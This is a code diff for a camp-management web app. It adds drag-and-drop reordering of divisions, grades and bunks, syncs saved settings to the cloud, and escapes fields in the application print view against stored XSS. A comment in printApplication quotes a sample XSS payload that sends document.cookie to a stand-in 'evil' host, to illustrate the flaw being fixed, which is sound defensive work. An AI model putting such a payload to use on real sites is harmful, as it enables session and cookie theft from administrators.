@@ -805,24 +805,249 @@ function syncAllAddressesToGo(){
 }
 
 // ── STRUCTURE ────────────────────────────────────────────────────
+function _getDivisionOrder(){
+    try{
+        var gs=window.loadGlobalSettings?window.loadGlobalSettings():{};
+        var ord=(gs.app1&&gs.app1.manualColumnOrder)||[];
+        return Array.isArray(ord)?ord:[];
+    }catch(_){return []}
+}
+function _saveDivisionOrder(order){
+    try{
+        var gs=window.loadGlobalSettings?window.loadGlobalSettings():{};
+        if(!gs.app1)gs.app1={};
+        gs.app1.manualColumnOrder=order;
+        if(window.saveGlobalSettings)window.saveGlobalSettings('app1',gs.app1);
+    }catch(e){console.warn('[CampistryMe] save order failed',e)}
+}
+function _sortedDivisions(){
+    var keys=Object.keys(structure);
+    var ord=_getDivisionOrder();
+    if(ord.length>0){
+        var pos={};ord.forEach(function(k,i){pos[k]=i});
+        keys.sort(function(a,b){
+            var ai=pos[a]==null?9999:pos[a];
+            var bi=pos[b]==null?9999:pos[b];
+            if(ai!==bi)return ai-bi;
+            return a.localeCompare(b);
+        });
+    }else{
+        keys.sort(function(a,b){
+            var na=parseInt(a),nb=parseInt(b);
+            if(!isNaN(na)&&!isNaN(nb))return na-nb;
+            return a.localeCompare(b);
+        });
+    }
+    return keys.map(function(k){return [k,structure[k]]});
+}
+function moveDivision(name,dir){
+    var keys=_sortedDivisions().map(function(e){return e[0]});
+    var i=keys.indexOf(name);
+    if(i<0)return;
+    var j=i+dir;
+    if(j<0||j>=keys.length)return;
+    var tmp=keys[i];keys[i]=keys[j];keys[j]=tmp;
+    _saveDivisionOrder(keys);
+    render(curPage);
+}
+function _commitStructureReorder(){
+    // Read DOM and rebuild structure objects in the new order.
+    var listEl=document.getElementById('meDivList');
+    if(!listEl)return;
+    listEl.querySelectorAll('.me-div-card').forEach(function(card){
+        var divName=card.getAttribute('data-div');
+        if(!divName||!structure[divName])return;
+        var divColor=structure[divName].color;
+        var newGrades={};
+        card.querySelectorAll('.me-grade-block').forEach(function(gBlock){
+            var gn=gBlock.getAttribute('data-grade');
+            if(!gn||!structure[divName].grades||!structure[divName].grades[gn])return;
+            var newBunks=Array.prototype.map.call(gBlock.querySelectorAll('.me-card-bunk'),function(c){return c.getAttribute('data-bunk')||c.textContent.trim()}).filter(Boolean);
+            newGrades[gn]={bunks:newBunks};
+        });
+        structure[divName]={color:divColor,grades:newGrades};
+    });
+    save();
+}
+
 function renderStructure(){
-    var c=document.getElementById('page-structure'),divs=Object.entries(structure).sort(function(a,b){return a[0].localeCompare(b[0])});
+    var c=document.getElementById('page-structure'),divs=_sortedDivisions();
     var h='<div class="sec-hd"><div><h2 class="sec-title">Camp Structure</h2></div><div class="sec-actions"><button class="me-btn me-btn--pri" onclick="CampistryMe.addDiv()">+ Add Division</button></div></div>';
     if(!divs.length){h+='<div class="me-empty"><h3>No divisions yet</h3><p>Create your camp structure.</p></div>'}
-    else divs.forEach(function([dn,dd]){
-        var grades=Object.entries(dd.grades||{}).sort(function(a,b){return a[0].localeCompare(b[0],undefined,{numeric:true})});
-        var bCt=grades.reduce(function(s,e){return s+(e[1].bunks||[]).length},0);
-        var col=dd.color||'#94A3B8';
-        h+='<div class="me-card" style="margin-bottom:10px"><div class="me-card-head"><div style="display:flex;align-items:center;gap:8px"><div style="width:10px;height:10px;border-radius:3px;background:'+col+'"></div><h3 style="margin:0">'+esc(dn)+'</h3><span style="font-size:.75rem;color:var(--s400)">'+grades.length+' grades · '+bCt+' bunks</span></div><div style="display:flex;gap:4px"><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editDiv(\''+je(dn)+'\')">Edit</button><button class="me-btn me-btn--danger me-btn--sm" onclick="CampistryMe.deleteDiv(\''+je(dn)+'\')">Delete</button></div></div>';
-        h+='<div style="padding:14px 18px">';
-        grades.forEach(function([gn,gd]){
-            h+='<div style="margin-bottom:10px"><div style="font-size:.8rem;font-weight:600;color:var(--s700);margin-bottom:4px">'+esc(gn)+'</div><div style="display:flex;flex-wrap:wrap;gap:4px">';
-            (gd.bunks||[]).forEach(function(b){h+='<span style="padding:3px 8px;border-radius:6px;border:1px solid var(--s200);font-size:.7rem;font-weight:600;color:var(--s600)">'+esc(b)+'</span>'});
+    else{
+        h+='<div id="meDivList"><div style="font-size:.72rem;color:var(--s400);margin-bottom:8px">Drag the ⋮⋮ handles or any chip to reorder divisions, grades, and bunks in place.</div>';
+        divs.forEach(function([dn,dd],ix){
+            // Honor stored insertion order (drag-reorders preserve it).
+            var grades=Object.entries(dd.grades||{});
+            var bCt=grades.reduce(function(s,e){return s+(e[1].bunks||[]).length},0);
+            var col=dd.color||'#94A3B8';
+            var upDis=ix===0?' disabled':'';
+            var dnDis=ix===divs.length-1?' disabled':'';
+            h+='<div class="me-card me-div-card" data-div="'+je(dn)+'" style="margin-bottom:10px"><div class="me-card-head"><div style="display:flex;align-items:center;gap:8px">'
+                +'<span class="me-grip me-div-grip" title="Drag to reorder division" style="cursor:grab;color:var(--s400);font-size:1rem;line-height:1;padding:0 4px;user-select:none">⋮⋮</span>'
+                +'<div style="width:10px;height:10px;border-radius:3px;background:'+col+'"></div><h3 style="margin:0">'+esc(dn)+'</h3><span style="font-size:.75rem;color:var(--s400)">'+grades.length+' grades · '+bCt+' bunks</span></div><div style="display:flex;gap:4px;align-items:center">'
+                +'<button class="me-btn me-btn--ghost me-btn--sm" title="Move up"'+upDis+' onclick="CampistryMe.moveDivision(\''+je(dn)+'\',-1)" style="padding:4px 8px">↑</button>'
+                +'<button class="me-btn me-btn--ghost me-btn--sm" title="Move down"'+dnDis+' onclick="CampistryMe.moveDivision(\''+je(dn)+'\',1)" style="padding:4px 8px">↓</button>'
+                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editDiv(\''+je(dn)+'\')">Edit</button>'
+                +'<button class="me-btn me-btn--danger me-btn--sm" onclick="CampistryMe.deleteDiv(\''+je(dn)+'\')">Delete</button>'
+                +'</div></div>';
+            h+='<div class="me-grade-list" data-div="'+je(dn)+'" style="padding:14px 18px">';
+            grades.forEach(function([gn,gd]){
+                h+='<div class="me-grade-block" data-grade="'+je(gn)+'" style="margin-bottom:10px;padding:6px 8px;border:1px dashed transparent;border-radius:6px">'
+                    +'<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px">'
+                        +'<span class="me-grip me-grade-grip" title="Drag to reorder grade" style="cursor:grab;color:var(--s400);font-size:.85rem;line-height:1;padding:0 2px;user-select:none">⋮⋮</span>'
+                        +'<div style="font-size:.8rem;font-weight:600;color:var(--s700)">'+esc(gn)+'</div>'
+                    +'</div>'
+                    +'<div class="me-card-bunks" data-grade="'+je(gn)+'" style="display:flex;flex-wrap:wrap;gap:4px;padding-left:18px">';
+                (gd.bunks||[]).forEach(function(b){
+                    h+='<span class="me-card-bunk" data-bunk="'+je(b)+'" draggable="true" style="padding:3px 8px;border-radius:6px;border:1px solid var(--s200);font-size:.7rem;font-weight:600;color:var(--s600);cursor:grab;user-select:none">'+esc(b)+'</span>';
+                });
+                h+='</div></div>';
+            });
             h+='</div></div>';
         });
-        h+='</div></div>';
-    });
+        h+='</div>';
+    }
     c.innerHTML=h;
+    // Wire drag-drop on division cards
+    var listEl=document.getElementById('meDivList');
+    if(listEl){
+        _meReorderInit(listEl,'.me-div-card');
+        listEl.querySelectorAll('.me-div-card').forEach(function(card){
+            _meAttachItemDrag(card);
+            card.addEventListener('dragend',function(){
+                var newOrder=Array.prototype.map.call(listEl.querySelectorAll('.me-div-card'),function(el){return el.getAttribute('data-div')});
+                _saveDivisionOrder(newOrder);
+                _commitStructureReorder();
+                render(curPage);
+            });
+        });
+        // Wire drag-drop on grade blocks within each division card
+        listEl.querySelectorAll('.me-grade-list').forEach(function(gradeList){
+            _meReorderInit(gradeList,'.me-grade-block');
+            gradeList.querySelectorAll('.me-grade-block').forEach(function(gBlock){
+                _meAttachItemDrag(gBlock);
+                gBlock.addEventListener('dragend',function(){
+                    _commitStructureReorder();
+                    render(curPage);
+                });
+            });
+        });
+        // Wire drag-drop on bunk chips within each grade block
+        listEl.querySelectorAll('.me-card-bunks').forEach(function(bunkRow){
+            _meHorizontalReorderInit(bunkRow,'.me-card-bunk');
+            bunkRow.querySelectorAll('.me-card-bunk').forEach(function(chip){
+                _meAttachItemDrag(chip);
+                chip.addEventListener('dragend',function(){
+                    _commitStructureReorder();
+                    render(curPage);
+                });
+            });
+        });
+    }
+}
+
+// ── Drag-drop helpers ──
+// Containers scope dragover handling to direct children matching childSelector,
+// so nested draggables (e.g. bunk chip inside a grade block inside a division
+// card) reorder within their own list without bubbling up to the parent list.
+function _meReorderInit(containerEl,childSelector){
+    if(!containerEl||containerEl._meDragInit)return;
+    containerEl._meDragInit=true;
+    containerEl.addEventListener('dragover',function(e){
+        var dragging=containerEl.querySelector(':scope > .me-dragging');
+        if(!dragging||!dragging.matches(childSelector))return;
+        e.preventDefault();e.dataTransfer.dropEffect='move';
+        var siblings=Array.prototype.slice.call(containerEl.children).filter(function(el){return el!==dragging&&el.matches(childSelector)});
+        var nextSibling=siblings.find(function(sib){
+            var box=sib.getBoundingClientRect();
+            return e.clientY<box.top+box.height/2;
+        });
+        containerEl.insertBefore(dragging,nextSibling||null);
+    });
+}
+function _meHorizontalReorderInit(containerEl,childSelector){
+    if(!containerEl||containerEl._meDragInit)return;
+    containerEl._meDragInit=true;
+    containerEl.addEventListener('dragover',function(e){
+        var dragging=containerEl.querySelector(':scope > .me-dragging');
+        if(!dragging||!dragging.matches(childSelector))return;
+        e.preventDefault();e.dataTransfer.dropEffect='move';
+        var siblings=Array.prototype.slice.call(containerEl.children).filter(function(el){return el!==dragging&&el.matches(childSelector)});
+        var nextSibling=siblings.find(function(sib){
+            var box=sib.getBoundingClientRect();
+            return e.clientX<box.left+box.width/2;
+        });
+        containerEl.insertBefore(dragging,nextSibling||null);
+    });
+}
+function _meAttachItemDrag(itemEl){
+    if(!itemEl||itemEl._meItemDragInit)return;
+    itemEl._meItemDragInit=true;
+    itemEl.draggable=true;
+    itemEl.addEventListener('dragstart',function(e){
+        e.stopPropagation();
+        itemEl.classList.add('me-dragging');
+        try{e.dataTransfer.effectAllowed='move';e.dataTransfer.setData('text/plain','reorder')}catch(_){}
+    });
+    itemEl.addEventListener('dragend',function(e){
+        e.stopPropagation();
+        itemEl.classList.remove('me-dragging');
+    });
+}
+
+function _renderBunkChipsHTML(bunks){
+    var inner='';
+    (bunks||[]).forEach(function(b){
+        inner+='<span class="me-bunk-chip" draggable="true"><span class="me-bunk-name">'+esc(b)+'</span><button type="button" class="me-bunk-x" title="Remove">×</button></span>';
+    });
+    return '<div class="fg"><label class="fl">Bunks <span style="font-weight:400;color:var(--s400);font-size:.7rem">(drag to reorder)</span></label>'
+        +'<div class="me-bunk-list dmGradeBunks">'+inner+'</div>'
+        +'<div style="display:flex;gap:6px;margin-top:6px"><input type="text" class="fi me-bunk-input" placeholder="Add bunk and press Enter" style="flex:1"><button type="button" class="me-btn me-btn--sec me-btn--sm me-bunk-add">+ Add</button></div>'
+        +'</div>';
+}
+function _renderGradeRowHTML(gn,bunks){
+    return '<div class="fg dm-grade-row" style="background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px;cursor:grab">'
+        +'<div class="fr" style="align-items:center;gap:6px">'
+            +'<span class="me-grip" title="Drag to reorder grade" style="cursor:grab;color:var(--s400);font-size:1rem;line-height:1;padding:0 4px;user-select:none">⋮⋮</span>'
+            +'<div class="fg" style="flex:1;margin:0"><label class="fl">Grade Name</label><input class="fi dmGradeN" value="'+esc(gn||'')+'" placeholder="e.g. 1st Grade"></div>'
+            +'<button type="button" class="me-btn me-btn--ghost me-btn--sm dm-grade-remove" title="Remove grade" style="color:var(--danger,#dc2626)">×</button>'
+        +'</div>'
+        +_renderBunkChipsHTML(bunks)
+        +'</div>';
+}
+function _wireGradeRow(rowEl){
+    if(!rowEl)return;
+    _meAttachItemDrag(rowEl);
+    var rmBtn=rowEl.querySelector('.dm-grade-remove');
+    if(rmBtn)rmBtn.onclick=function(){if(confirm('Remove this grade?'))rowEl.remove()};
+    var bunkList=rowEl.querySelector('.me-bunk-list');
+    var addInp=rowEl.querySelector('.me-bunk-input');
+    var addBtn=rowEl.querySelector('.me-bunk-add');
+    if(bunkList){
+        _meHorizontalReorderInit(bunkList,'.me-bunk-chip');
+        bunkList.querySelectorAll('.me-bunk-chip').forEach(_wireBunkChip);
+    }
+    function addBunk(){
+        var v=(addInp.value||'').trim();
+        if(!v)return;
+        // Allow multiple comma-separated bunks via the add input.
+        v.split(',').map(function(s){return s.trim()}).filter(Boolean).forEach(function(name){
+            var span=document.createElement('span');
+            span.className='me-bunk-chip';span.draggable=true;
+            span.innerHTML='<span class="me-bunk-name">'+esc(name)+'</span><button type="button" class="me-bunk-x" title="Remove">×</button>';
+            bunkList.appendChild(span);
+            _wireBunkChip(span);
+        });
+        addInp.value='';addInp.focus();
+    }
+    if(addBtn)addBtn.onclick=addBunk;
+    if(addInp)addInp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();addBunk()}});
+}
+function _wireBunkChip(chip){
+    _meAttachItemDrag(chip);
+    var x=chip.querySelector('.me-bunk-x');
+    if(x)x.onclick=function(){chip.remove()};
 }
 
 // Division create/edit
@@ -835,21 +1060,25 @@ function openDivForm(name){
     COLORS.forEach(function(c){h+='<button class="swatch'+(d.color===c?' sel':'')+'" style="background:'+c+'" data-color="'+c+'" onclick="CampistryMe._pickColor(this)"></button>'});
     h+='</div><input type="hidden" id="dmColor" value="'+(d.color||COLORS[0])+'"></div>';
     // Grades + Bunks
-    h+='<div class="fsec">Grades & Bunks</div><div id="dmGrades">';
-    Object.entries(d.grades||{}).forEach(function([gn,gd],i){
-        h+='<div class="fg" style="background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px"><div class="fr"><div class="fg" style="flex:1"><label class="fl">Grade Name</label><input class="fi dmGradeN" value="'+esc(gn)+'"></div></div><div class="fg"><label class="fl">Bunks (comma separated)</label><input class="fi dmGradeB" value="'+esc((gd.bunks||[]).join(', '))+'"></div></div>';
+    h+='<div class="fsec">Grades & Bunks <span style="font-weight:400;color:var(--s400);font-size:.75rem">(drag the ⋮⋮ handle to reorder)</span></div><div id="dmGrades">';
+    Object.entries(d.grades||{}).forEach(function([gn,gd]){
+        h+=_renderGradeRowHTML(gn,gd.bunks||[]);
     });
     h+='</div><button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe._addGradeRow()">+ Add Grade</button>';
     document.getElementById('dmBody').innerHTML=h;
+    var dmGrades=document.getElementById('dmGrades');
+    _meReorderInit(dmGrades,'.dm-grade-row');
+    dmGrades.querySelectorAll('.dm-grade-row').forEach(_wireGradeRow);
     document.getElementById('dmSave').onclick=saveDiv;
     openModal('divModal');
 }
 function _addGradeRow(){
     var cont=document.getElementById('dmGrades');
-    var div=document.createElement('div');
-    div.className='fg';div.style.cssText='background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px';
-    div.innerHTML='<div class="fr"><div class="fg" style="flex:1"><label class="fl">Grade Name</label><input class="fi dmGradeN" value="" placeholder="e.g. 1st Grade"></div></div><div class="fg"><label class="fl">Bunks (comma separated)</label><input class="fi dmGradeB" value="" placeholder="Bunk 1, Bunk 2"></div>';
-    cont.appendChild(div);
+    var tmp=document.createElement('div');
+    tmp.innerHTML=_renderGradeRowHTML('',[]);
+    var row=tmp.firstChild;
+    cont.appendChild(row);
+    _wireGradeRow(row);
 }
 function _pickColor(el){
     document.querySelectorAll('.swatch').forEach(function(s){s.classList.remove('sel')});
@@ -861,11 +1090,13 @@ function saveDiv(){
     if(!name){toast('Name required','error');return}
     var color=document.getElementById('dmColor').value||COLORS[0];
     var grades={};
-    var gradeNs=document.querySelectorAll('.dmGradeN');
-    var gradeBs=document.querySelectorAll('.dmGradeB');
-    gradeNs.forEach(function(el,i){
-        var gn=el.value.trim();if(!gn)return;
-        var bunks=(gradeBs[i]?gradeBs[i].value:'').split(',').map(function(s){return s.trim()}).filter(Boolean);
+    // Iterate grade rows in DOM order so drag-reorder is preserved.
+    var rows=document.querySelectorAll('#dmGrades .dm-grade-row');
+    rows.forEach(function(row){
+        var nameEl=row.querySelector('.dmGradeN');
+        var gn=nameEl?nameEl.value.trim():'';
+        if(!gn)return;
+        var bunks=Array.prototype.map.call(row.querySelectorAll('.me-bunk-chip .me-bunk-name'),function(s){return s.textContent.trim()}).filter(Boolean);
         grades[gn]={bunks:bunks};
     });
     if(editingDiv&&editingDiv!==name){
@@ -1296,32 +1527,49 @@ function saveAppNote(id){
 function printApplication(id){
     var e=enrollments[id];if(!e)return;
     var w=window.open('','_blank','width=800,height=900');
-    var h='<html><head><title>Application — '+e.camperName+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
-    h+='<h1>'+esc(e.camperName)+'</h1>';
-    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+e.status+' · Applied: '+e.appliedDate+'</div>';
 
-    function sec(t){return'<h2>'+t+'</h2><table>'}
-    function row(l,v){return v?'<tr><td>'+l+'</td><td>'+v+'</td></tr>':''}
+    // Stored-XSS hardening: every enrollment field originates from the
+    // unauthenticated public registration form. Earlier this helper
+    // interpolated raw values directly into HTML — an attacker submitting
+    // `e.medicalNotes = "<img src=x onerror=fetch('//evil/?'+document.cookie)>"`
+    // would execute in the admin's print window, with full session.
+    // Now: row() escapes by default; rowRaw() exists for pre-built HTML;
+    // signature is validated against a strict data-URL allow-list.
+
+    function sec(t){return'<h2>'+esc(t)+'</h2><table>'}
+    function row(l,v){return v?'<tr><td>'+esc(l)+'</td><td>'+esc(v)+'</td></tr>':''}
+    function rowRaw(l,html){return html?'<tr><td>'+esc(l)+'</td><td>'+html+'</td></tr>':''}
     function end(){return'</table>'}
 
+    function isSafeImageDataUrl(s){
+        // Data URLs only; PNG / JPEG / GIF / WebP / SVG-data variants we can't
+        // distinguish are excluded. SVG can carry script — never accept it.
+        return typeof s === 'string' &&
+               /^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);
+    }
+
+    var h='<html><head><title>'+esc('Application — '+e.camperName)+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
+    h+='<h1>'+esc(e.camperName)+'</h1>';
+    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+esc(e.status)+' · Applied: '+esc(e.appliedDate)+'</div>';
+
     h+=sec('Camper');
-    h+=row('Name',esc(e.camperName));h+=row('DOB',e.dob);h+=row('Gender',e.gender);
+    h+=row('Name',e.camperName);h+=row('DOB',e.dob);h+=row('Gender',e.gender);
     h+=row('School',e.school);h+=row('Grade',e.schoolGrade);h+=row('Teacher',e.teacher);h+=end();
 
     h+=sec('Parent/Guardian');
-    h+=row('Name',esc(e.parentName)+(e.parentRelation?' ('+e.parentRelation+')':''));
+    h+=row('Name',e.parentName+(e.parentRelation?' ('+e.parentRelation+')':''));
     h+=row('Phone',e.parentPhone);h+=row('Email',e.parentEmail);
-    if(e.parent2Name)h+=row('Parent 2',esc(e.parent2Name)+(e.parent2Phone?' — '+e.parent2Phone:''));h+=end();
+    if(e.parent2Name)h+=row('Parent 2',e.parent2Name+(e.parent2Phone?' — '+e.parent2Phone:''));h+=end();
 
     h+=sec('Address');
     h+=row('Street',e.street);h+=row('City',e.city);h+=row('State',e.state);h+=row('ZIP',e.zip);h+=end();
 
     h+=sec('Emergency Contact');
-    h+=row('Name',esc(e.emergencyName)+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();
+    h+=row('Name',e.emergencyName+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();
 
     h+=sec('Medical');
-    h+=row('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':'None');
-    h+=row('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':'None');
+    h+=rowRaw('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':esc('None'));
+    h+=rowRaw('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':esc('None'));
     h+=row('Dietary',e.dietary||'None');h+=row('Notes',e.medicalNotes);h+=end();
 
     h+=sec('Preferences');
@@ -1337,7 +1585,7 @@ function printApplication(id){
         var labels=e.customQuestionLabels||[];
         Object.entries(e.customAnswers).forEach(function([key,val]){
             var idx=parseInt(key.replace('q',''));var label=labels[idx]||('Question '+(idx+1));
-            h+=row(label,Array.isArray(val)?val.join(', '):esc(val));
+            h+=row(label,Array.isArray(val)?val.join(', '):val);
         });h+=end();
     }
 
@@ -1346,11 +1594,18 @@ function printApplication(id){
         e.documents.forEach(function(d){h+='<div style="padding:2px 0">📄 '+esc(d.name)+'</div>'});
     }
 
-    if(e.signature){h+=sec('Signature');h+='<img src="'+e.signature+'">';}
+    if(e.signature){
+        h+=sec('Signature');
+        if(isSafeImageDataUrl(e.signature)){
+            h+='<img src="'+e.signature+'">';
+        }else{
+            h+='<div style="color:#94A3B8;font-size:11px">[Signature omitted — invalid image format]</div>';
+        }
+    }
 
     if(e.adminNotes){h+=sec('Admin Notes');h+='<p>'+esc(e.adminNotes)+'</p>';}
 
-    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+new Date().toLocaleString()+'</div>';
+    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+esc(new Date().toLocaleString())+'</div>';
     h+='</body></html>';
     w.document.write(h);w.document.close();
     setTimeout(function(){w.print()},300);
@@ -2778,7 +3033,16 @@ function removeBroadcast(idx){
 // ═══════════════════════════════════════════════════════════════
 var campForms=[];
 function loadForms(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campForms=(s.campistryMe&&s.campistryMe.forms)||[]}
-function saveForms(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');if(!s.campistryMe)s.campistryMe={};s.campistryMe.forms=campForms;localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s))}
+function saveForms(){
+    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+    if(!s.campistryMe)s.campistryMe={};
+    s.campistryMe.forms=campForms;
+    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    // Route through saveGlobalSettings so the value reaches IDB + cloud.
+    // Writing localStorage alone left forms cloud-orphaned.
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
+}
 
 function renderForms(){
     loadForms();
@@ -2996,6 +3260,11 @@ function saveSettings(){
     s.camp_name=document.getElementById('settCampName').value.trim();
     s.campName=s.camp_name;
     localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    // Fan out to cloud — localStorage alone never reached Supabase.
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
+        window.saveGlobalSettings('camp_name',s.camp_name);
+        window.saveGlobalSettings('campName',s.camp_name);
+    }
     save();toast('Settings saved');
 }
 function saveLocaleSettings(){
@@ -3008,6 +3277,8 @@ function saveLocaleSettings(){
         rtl:document.getElementById('settRTL').checked
     };
     localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
     // Apply RTL immediately
     if(s.campistryMe.campSettings.rtl) document.documentElement.setAttribute('dir','rtl');
     else document.documentElement.removeAttribute('dir');
@@ -3018,6 +3289,8 @@ function saveStripeKey(){
     if(!s.campistryMe)s.campistryMe={};
     s.campistryMe.stripePublishableKey=(document.getElementById('settStripeKey').value||'').trim();
     localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
     save();toast('Stripe key saved');
 }
 function exportAllData(){
@@ -3034,6 +3307,15 @@ function importAllData(){
                 var data=JSON.parse(e.target.result);
                 if(!confirm('This will replace ALL your data. Are you sure?'))return;
                 localStorage.setItem('campGlobalSettings_v1',JSON.stringify(data));
+                // Fan out every imported top-level key to cloud — without
+                // this, importing on Device A leaves Device B reading the
+                // pre-import cloud state on next hydration.
+                if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
+                    Object.keys(data||{}).forEach(function(k){
+                        if(k==='updated_at')return;
+                        try{window.saveGlobalSettings(k,data[k]);}catch(e){console.warn('Import sync failed for',k,e);}
+                    });
+                }
                 loadData();render(curPage);toast('Data imported');
             }catch(err){alert('Invalid file: '+err.message)}
         };r.readAsText(inp.files[0]);
@@ -3131,7 +3413,14 @@ function reEnrollCamper(camperName){
 // ═══════════════════════════════════════════════════════════════
 var customFields=[];
 function loadCustomFields(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');customFields=(s.campistryMe&&s.campistryMe.customFields)||[]}
-function saveCustomFields(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');if(!s.campistryMe)s.campistryMe={};s.campistryMe.customFields=customFields;localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s))}
+function saveCustomFields(){
+    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+    if(!s.campistryMe)s.campistryMe={};
+    s.campistryMe.customFields=customFields;
+    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
+}
 function manageCustomFields(){
     loadCustomFields();
     var h='<p style="font-size:.85rem;color:var(--s600);margin-bottom:14px">Define custom fields that appear on every camper profile.</p><div id="cfList">';
@@ -3353,6 +3642,13 @@ function importRows(rows){
         g.campistryMe.bunkAssignments={};
         g.campistryMe.nextCamperId=1;
         localStorage.setItem('campGlobalSettings_v1',JSON.stringify(g));
+        // Fan the wipe out to cloud — otherwise the next hydration
+        // re-pulls the pre-wipe roster/families and undoes the reset.
+        if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
+            window.saveGlobalSettings('campStructure',g.campStructure);
+            window.saveGlobalSettings('app1',g.app1);
+            window.saveGlobalSettings('campistryMe',g.campistryMe);
+        }
     }catch(e){}
 
     // ═══ PASS 1: Build camp structure from CSV data ═══
@@ -3531,7 +3827,7 @@ window.CampistryMe={
     viewCamper:viewCamper,editCamper:editCamper,addCamper:addCamper,
     addFamily:function(){openFamilyForm(null)},editFamily:function(id){openFamilyForm(id)},
     acceptFamilySuggestion:acceptFamilySuggestion,dismissFamilySuggestion:dismissFamilySuggestion,acceptAddToFamily:acceptAddToFamily,
-    addDiv:function(){openDivForm(null)},editDiv:function(n){openDivForm(n)},deleteDiv:deleteDiv,
+    addDiv:function(){openDivForm(null)},editDiv:function(n){openDivForm(n)},deleteDiv:deleteDiv,moveDivision:moveDivision,
     openCsv:function(){openModal('csvModal')},exportCsv:exportCsv,downloadTemplate:downloadTemplate,
     bbDrop:bbDrop,autoAssign:autoAssign,clearBunks:clearBunks,
     addSession:addSession,deleteSession:deleteSession,editSession:editSession,toggleSessionReg:toggleSessionReg,copyRegLink:copyRegLink,addApplication:addApplication,autoPromoteWaitlist:autoPromoteWaitlist,
